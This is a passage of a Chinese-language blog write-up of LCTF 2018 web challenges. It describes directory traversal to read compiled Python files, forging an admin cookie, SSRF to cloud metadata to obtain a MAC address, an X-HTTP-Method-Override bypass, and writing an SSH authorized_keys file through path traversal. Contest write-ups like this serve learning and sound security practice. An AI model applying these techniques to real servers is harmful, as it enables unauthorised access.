+<p>这代码意思还比较明确，就是拿来解析url参数，然后读取文件内容的。这里要用到这个特性<img src="https://www.github.com/coomrade/Img/raw/master/pics/1542657659504.png" alt="enter description here">由此可以实现目录穿越。随便输一点<img src="https://www.github.com/coomrade/Img/raw/master/pics/1542661178095.png" alt="enter description here">得到了<code>basedir</code>。这里有一个知识点，运行python脚本时会生成一个<code>__pycache__</code>目录，里面存放的是pyc<img src="https://www.github.com/coomrade/Img/raw/master/pics/1542661099820.png" alt="enter description here">这里可以直接读一下，列目录<img src="https://www.github.com/coomrade/Img/raw/master/pics/1542661127419.png" alt="enter description here">拿到<code>main.pyc</code>和<code>session.pyc</code>，拿去反编译<br>main.py:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    user = request.cookies.get(<span class="string">'user'</span>, <span class="string">''</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        username = session_decode(user)</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        username = get_username()</span><br><span class="line">        content = escape(username)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> username == <span class="string">'admin'</span>:</span><br><span class="line">            content = escape(FLAG)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            content = escape(username)</span><br><span class="line"></span><br><span class="line">    resp = make_response(render_template(<span class="string">'main.html'</span>, content=content))</span><br><span class="line">    <span class="keyword">return</span> resp</span><br></pre></td></tr></table></figure></p>
+<p>session.py:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">session_decode</span><span class="params">(info)</span>:</span></span><br><span class="line">    info_list = str.split(info, <span class="string">'.'</span>)</span><br><span class="line">    <span class="keyword">if</span> len(info_list) != <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">'error info'</span>)</span><br><span class="line">    info_ = decode(info_list[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> hash_verify(info_list[<span class="number">1</span>], info_):</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">'hash wrong'</span>)</span><br><span class="line">    <span class="keyword">return</span> info_</span><br></pre></td></tr></table></figure></p>
+<p>hash.py:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">class MDA:</span><br><span class="line">    def insert(self, inBuf):</span><br><span class="line">        self.init()</span><br><span class="line">        self.update(inBuf)</span><br><span class="line">    def grouping(self, inBufGroup):</span><br><span class="line">        hexdigest_group = &apos;&apos;</span><br><span class="line">        for inBuf in inBufGroup:</span><br><span class="line">            self.insert(inBuf)</span><br><span class="line">            hexdigest_group += self.hexdigest()</span><br><span class="line">        return hexdigest_group</span><br></pre></td></tr></table></figure></p>
+<p>可以看到，目的就是伪造cookie,这里他是每个字符分开去算，然后拼接，所以要做的就是分别找到a,d,m,i,n所对应的加密后的内容。这里只要一直把cookie清空，然后发多几次包收集一下就可以了<img src="https://www.github.com/coomrade/Img/raw/master/pics/1542662747517.png" alt="enter description here"><img src="https://www.github.com/coomrade/Img/raw/master/pics/1542662760891.png" alt="enter description here"><img src="https://www.github.com/coomrade/Img/raw/master/pics/1542663224084.png" alt="enter description here">最终:<code>user=MFSG22LO.b962d95efd25247984407154c863ef36e80346042c47531a6e1beb0db216d969b020cd1cf4031b57</code>(.前面就是个base32)<br>Finally…<img src="https://www.github.com/coomrade/Img/raw/master/pics/1542663400397.png" alt="enter description here"></p>
+<h1 id="Travel"><a href="#Travel" class="headerlink" title="Travel"></a>Travel</h1><p>description:</p>
+<blockquote>
+<p>Go where you want to go<br>hint1: 没有需要扫描和fuzz的东西，RTFM!!!<br>hint2: 留意云服务商和差异性<br>hint3: header</p>
+</blockquote>
+<p>进来就是源码<img src="https://www.github.com/coomrade/Img/raw/master/pics/1542655965898.png" alt="enter description here"><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*- </span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request, render_template </span><br><span class="line"><span class="keyword">from</span> config <span class="keyword">import</span> create_app </span><br><span class="line"><span class="keyword">import</span> os </span><br><span class="line"><span class="keyword">import</span> urllib </span><br><span class="line"><span class="keyword">import</span> requests </span><br><span class="line"><span class="keyword">import</span> uuid </span><br><span class="line">app = create_app() </span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/upload/', methods = ['PUT']) </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload_file</span><span class="params">(filename)</span>:</span> </span><br><span class="line">	name = request.cookies.get(<span class="string">'name'</span>) </span><br><span class="line">	pwd = request.cookies.get(<span class="string">'pwd'</span>) </span><br><span class="line">	<span class="keyword">if</span> name != <span class="string">'lctf'</span> <span class="keyword">or</span> pwd != str(uuid.getnode()): </span><br><span class="line">		<span class="keyword">return</span> <span class="string">"0"</span> </span><br><span class="line">	filename = urllib.unquote(filename) </span><br><span class="line">	<span class="keyword">with</span> open(os.path.join(app.config[<span class="string">'UPLOAD_FOLDER'</span>], filename), <span class="string">'w'</span>) <span class="keyword">as</span> f: </span><br><span class="line">		f.write(request.get_data(as_text = <span class="keyword">True</span>)) </span><br><span class="line">		<span class="keyword">return</span> <span class="string">"1"</span> </span><br><span class="line">	<span class="keyword">return</span> <span class="string">"0"</span> </span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/', methods = ['GET']) </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span> </span><br><span class="line">	url = request.args.get(<span class="string">'url'</span>, <span class="string">''</span>) </span><br><span class="line">	<span class="keyword">if</span> url == <span class="string">''</span>: </span><br><span class="line">		<span class="keyword">return</span> render_template(<span class="string">'index.html'</span>) </span><br><span class="line">	<span class="keyword">if</span> <span class="string">"http"</span> != url[: <span class="number">4</span>]: </span><br><span class="line">		<span class="keyword">return</span> <span class="string">"hacker"</span> </span><br><span class="line">	<span class="keyword">try</span>: response = requests.get(url, timeout = <span class="number">10</span>) </span><br><span class="line">	response.encoding = <span class="string">'utf-8'</span> </span><br><span class="line">	<span class="keyword">return</span> response.text </span><br><span class="line">	<span class="keyword">except</span>: </span><br><span class="line">		<span class="keyword">return</span> <span class="string">"Something Error"</span> </span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/source', methods = ['GET']) </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_source</span><span class="params">()</span>:</span> </span><br><span class="line">	<span class="keyword">return</span> open(__file__).read() </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>: </span><br><span class="line">	app.run()</span><br></pre></td></tr></table></figure></p>
+<p>有一个发送请求的功能，然后可以看到<code>upload</code>处的关键代码<img src="https://www.github.com/coomrade/Img/raw/master/pics/1542658039560.png" alt="enter description here">它先进行了一次urldecode(所以要二次编码)，然后把POST的body的值写入指定的文件，这里同样要用到这个关键特性<img src="https://www.github.com/coomrade/Img/raw/master/pics/1542657659504.png" alt="enter description here">因此前面的路径名是无效的。还可以看到<code>upload</code>处需要获得<code>uuid.getnode()</code>的值，也就是MAC地址的十进制(HCTF碰到过)<img src="https://www.github.com/coomrade/Img/raw/master/pics/1542656338222.png" alt="enter description here">hint说留意云服务商和差异性，那么查一查<img src="https://www.github.com/coomrade/Img/raw/master/pics/1542656261265.png" alt="enter description here">发现是腾讯云，再看看腾讯云的<a href="https://cloud.tencent.com/document/product/213/4934" target="_blank" rel="noopener">文档</a>，看到这个<img src="https://www.github.com/coomrade/Img/raw/master/pics/1542656597310.png" alt="enter description here">拿到mac地址<img src="https://www.github.com/coomrade/Img/raw/master/pics/1542656639034.png" alt="enter description here">那么<code>uuid.getnode()</code>就是<code>90520735500403</code><img src="https://www.github.com/coomrade/Img/raw/master/pics/1542656953713.png" alt="enter description here">接下来的问题，怎么用PUT请求去访问<code>upload</code>?nginx仅用了PUT请求，要用<code>X-HTTP-Method-Override:PUT</code>绕过。然后就是往目标机器写<code>authorized_keys</code>了，可以写<code>/home/lctf/.ssh/authorized_keys</code><img src="https://www.github.com/coomrade/Img/raw/master/pics/1542658442296.png" alt="enter description here">登上去读flag即可<img src="https://www.github.com/coomrade/Img/raw/master/pics/1542658625237.png" alt="enter description here"></p>
+<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://www.anquanke.com/post/id/164569" target="_blank" rel="noopener">https://www.anquanke.com/post/id/164569</a><br><a href="https://xz.aliyun.com/t/3341#toc-18" target="_blank" rel="noopener">https://xz.aliyun.com/t/3341#toc-18</a><br><a href="https://www.anquanke.com/post/id/99793" target="_blank" rel="noopener">https://www.anquanke.com/post/id/99793</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/反序列化/" rel="tag"># 反序列化</a>
+          
+            <a href="/tags/代码审计/" rel="tag"># 代码审计</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/11/14/HCTF2018-writeup/" rel="next" title="HCTF2018-writeup">
+                <i class="fa fa-chevron-left"></i> HCTF2018-writeup
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目錄
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            本站概覽
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/gabe-crow.jpg"
+                alt="C0mRaDe" />
+            
+              <p class="site-author-name" itemprop="name">C0mRaDe</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">32</span>
+                  <span class="site-state-item-name">文章</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">1</span>
+                  <span class="site-state-item-name">分類</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">25</span>
+                  <span class="site-state-item-name">標籤</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#bestphp’s-revenge"><span class="nav-number">1.</span> <span class="nav-text">bestphp’s revenge</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#session-start"><span class="nav-number">1.1.</span> <span class="nav-text">session_start</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#序列化处理器"><span class="nav-number">1.2.</span> <span class="nav-text">序列化处理器</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Soapclient"><span class="nav-number">1.3.</span> <span class="nav-text">Soapclient</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#call-user-func"><span class="nav-number">1.4.</span> <span class="nav-text">call_user_func</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#God-of-domain-pentest"><span class="nav-number">2.</span> <span class="nav-text">God of domain-pentest</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#webshell"><span class="nav-number">2.1.</span> <span class="nav-text">webshell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#reGeorg与proxychains配合使用"><span class="nav-number">2.2.</span> <span class="nav-text">reGeorg与proxychains配合使用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#进内网getshell"><span class="nav-number">2.3.</span> <span class="nav-text">进内网getshell</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#T4lk-1s-ch34p-sh0w-m3-the-sh31l"><span class="nav-number">3.</span> <span class="nav-text">T4lk 1s ch34p,sh0w m3 the sh31l</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#分析"><span class="nav-number">3.1.</span> <span class="nav-text">分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#解题过程"><span class="nav-number">3.2.</span> <span class="nav-text">解题过程</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#sh0w-m3-the-sh31l-4ga1n"><span class="nav-number">4.</span> <span class="nav-text">sh0w m3 the sh31l 4ga1n</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#假的secret"><span class="nav-number">4.1.</span> <span class="nav-text">假的secret</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#预期解"><span class="nav-number">4.2.</span> <span class="nav-text">预期解</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#L-playground2"><span class="nav-number">5.</span> <span class="nav-text">L playground2</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Travel"><span class="nav-number">6.</span> <span class="nav-text">Travel</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Reference"><span class="nav-number">7.</span> <span class="nav-text">Reference</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">C0mRaDe</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 強力驅動</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主題 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
